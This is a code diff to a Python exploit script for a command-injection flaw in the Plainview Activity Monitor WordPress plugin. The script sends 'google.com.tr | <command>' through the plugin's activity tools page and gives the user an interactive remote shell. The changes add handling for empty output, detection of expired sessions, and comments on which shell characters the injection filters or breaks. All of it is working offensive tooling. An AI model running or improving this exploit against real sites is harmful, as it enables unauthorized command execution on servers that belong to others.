@@ -88,7 +88,7 @@ def login(base_url, username, password):
 
 
 def extract_dig_output(html):
-    """Return command output from vulnerable page HTML, or None."""
+    """Return command stdout, '' for valid empty output, or None when page is not vulnerable/session dead."""
     if MARKER not in html:
         return None
     try:
@@ -97,33 +97,63 @@ def extract_dig_output(html):
         return None
     soup = BeautifulSoup(html_doc, "html.parser")
     if not soup.p:
-        return None
+        # Marker present but no output paragraph = command ran with no stdout (e.g. cd, touch)
+        return ""
     return soup.p.get_text().strip()
 
 
-def run_command(session, base_url, cmd):
-    """Send one injected command. Returns output string or None."""
+def run_command(session, base_url, cmd, verbose=True):
+    """Send one injected command. Returns output string (may be '') or None on real failure."""
     url = base_url + "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
+    # Original delimiter must stay '|': server runs `dig <input>` in shell.
+    # ';' is filtered here (marker disappears), and '&' '>' break extraction.
+    # So do NOT auto-add 2>&1 and tell user not to type their own | & >.
     payload = "google.com.tr | " + cmd
     data = {"ip": payload, "lookup": "lookup"}
     try:
         r = session.post(url, data=data, timeout=TIMEOUT)
     except requests.RequestException as e:
-        print(f"[!] Command request failed: {e}")
+        if verbose:
+            print(f"[!] Command request failed: {e}")
         return None
     if r.status_code != 200:
-        print(f"[!] Unexpected HTTP {r.status_code} from activity_tools page.")
+        if verbose:
+            print(f"[!] Unexpected HTTP {r.status_code} from activity_tools page.")
+        return None
+    # Session died and we were bounced to login?
+    if "wp-login.php" in r.url or ('name="log"' in r.text and 'name="pwd"' in r.text and MARKER not in r.text):
+        if verbose:
+            print("[!] Session expired or logged out (bounced to wp-login.php). Re-run login.")
         return None
     out = extract_dig_output(r.text)
     if out is None:
-        print("[!] No dig output found. Plugin missing/patched or session expired.")
-        # Debug hint: uncomment to see raw response
-        # print(r.text[:2000])
+        low = r.text.lower()
+        is_login = "wp-login.php" in r.url or ('name="log"' in r.text and 'name="pwd"' in r.text)
+        still_plugin_page = ("plainview" in low or "activity_tools" in r.text) and not is_login
+        if still_plugin_page:
+            # Marker absent but we are still on vulnerable page = command produced no stdout.
+            # Typical: 'cd /home' (prints nothing, non-persistent), empty file, or stderr-only error
+            # (e.g. permission denied goes to stderr, '|' pipes stdout only).
+            if verbose:
+                print("[*] empty output – command produced no stdout (e.g. 'cd' prints nothing and does not stick, empty file, or permission-denied to stderr).")
+                print("    Use absolute paths: ls -la /home. For denied files, stderr is not shown via '|' – try readable files.")
+            return ""
+        if verbose:
+            print("[!] No dig output found. Plugin missing/patched or session expired.")
+            print(f"    DEBUG: HTTP 200 len={len(r.text)} marker_present={MARKER in r.text} url={r.url}")
+            print("    Hint: use simple commands only – ls /home, cat /path. Do not type | & > < ; 2>&1 – they break the single '|' injection.")
         return None
+    if out == "":
+        if verbose:
+            print("[*] empty output – command ran with no stdout (e.g. 'cd' prints nothing, empty file, or permission denied with no stderr).")
+            print("    Note: each command is a new shell, 'cd /home' does not stick – use absolute paths like 'ls -la /home'.")
+        return ""
     return out
 
 
 def exploit(session, base_url, whoami, ip_label):
+    print("[*] Each command is a new shell – 'cd' does not stick. Use absolute paths: ls /home, cat /home/file")
+    print("[*] Use simple commands only – do not type | & > ; – payload is already 'google.com.tr | <your cmd>'.")
     while True:
         try:
             cmd = input(whoami + "@" + ip_label + "  ").strip()
@@ -135,9 +165,14 @@ def exploit(session, base_url, whoami, ip_label):
         if cmd.lower() in ("exit", "quit", "q"):
             print("[*] Bye.")
             break
+        if cmd == "cd" or cmd.startswith("cd "):
+            print("[*] 'cd' prints nothing and resets next command – e.g. use 'ls -la /home' instead of 'cd /home; ls'. Still running it:")
         out = run_command(session, base_url, cmd)
-        if out is not None:
-            print(out)
+        if out is None:
+            continue
+        if out == "":
+            continue  # explanation already printed inside run_command
+        print(out)
 
 
 def poc(session, base_url, ip_label):
